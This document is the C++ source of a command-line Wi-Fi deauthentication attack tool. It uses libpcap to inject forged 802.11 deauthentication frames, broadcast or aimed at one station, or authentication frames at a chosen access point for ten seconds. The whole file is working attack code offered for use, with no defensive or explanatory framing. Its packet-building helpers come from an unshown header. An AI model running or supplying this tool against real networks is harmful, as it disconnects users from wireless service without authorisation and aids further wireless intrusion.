#include <iostream>
#include <pcap.h>
#include <signal.h>

#include "utill.h"

pcap_t *global_handle;

void usage();
void close_all_handles(pcap_t *pcap_handle);
void catch_signal(int signal);

#define AUTH_OPTION "-auth"

int main(int argc, char *argv[]){
    if (argc < 3) {
        usage();
        return -1;
    }
    signal(SIGINT, catch_signal);

    char *interface_name = argv[1];
    char *ap_mac = argv[2];
    char *station_mac = argc > 3 ? argv[3] : nullptr;
    char *auth = argc > 4 ? argv[4] : nullptr;
    bool mode_flag = true;

    struct Packet deauth_packet;
    struct AuthPacket auth_packet;

    try {
        PacketBuilder::init_packet(&deauth_packet, ap_mac);
        if (argc == 3) {
            std::cout << "AP_Broadcast Mode" << std::endl;
            PacketBuilder::ap_broadcast_frame(&deauth_packet);
        } else if (argc == 4) {
            PacketBuilder::ap_unicast_frame(&deauth_packet, station_mac);
            std::cout << "AP_Unicast_Frame Mode" << std::endl;
        } else if (argc == 5 && strcmp(auth, AUTH_OPTION) == 0) {
            std::cout << "Turn Auth mode" << std::endl;
            PacketBuilder::auth_init(&auth_packet, ap_mac, station_mac);
            mode_flag = false;
        } else {
            usage();
            return -1;
        }
    } catch (const std::exception &e) {
        std::cerr << "An error occurred during packet initialization: " << e.what() << std::endl;
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface_name, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", interface_name, errbuf);
        return -1;
    } else {
        global_handle = handle;
    }

    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < 10) {
        if (mode_flag) {
            if (pcap_sendpacket(handle, (unsigned char *)&deauth_packet, sizeof(deauth_packet)) != 0) {
                std::cout << "Deauth_frame send fail" << std::endl;
                close_all_handles(handle);
                return -1;
            }
        } else {
            if (pcap_sendpacket(handle, (unsigned char *)&auth_packet, sizeof(auth_packet)) != 0) {
                std::cout << "Auth_frame send fail" << std::endl;
                close_all_handles(handle);
                return -1;
            }
        }
        sleep(1); // or usleep(10000); ?
    }
    close_all_handles(global_handle);
    return 0;
}

void usage() {
    std::cout << "Syntax is incorrect." << std::endl;
    std::cout << "syntax : deauth <interface> <ap_mac> [<station_mac> [-auth]]" << std::endl;
    std::cout << "sample : deauth mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
}

void catch_signal(int signal) {
    std::cout << "Detect Exit Signal, Closing all handles..." << std::endl;
    close_all_handles(global_handle);
    exit(0);
}

void close_all_handles(pcap_t *pcap_handle) {
    pcap_close(pcap_handle);
}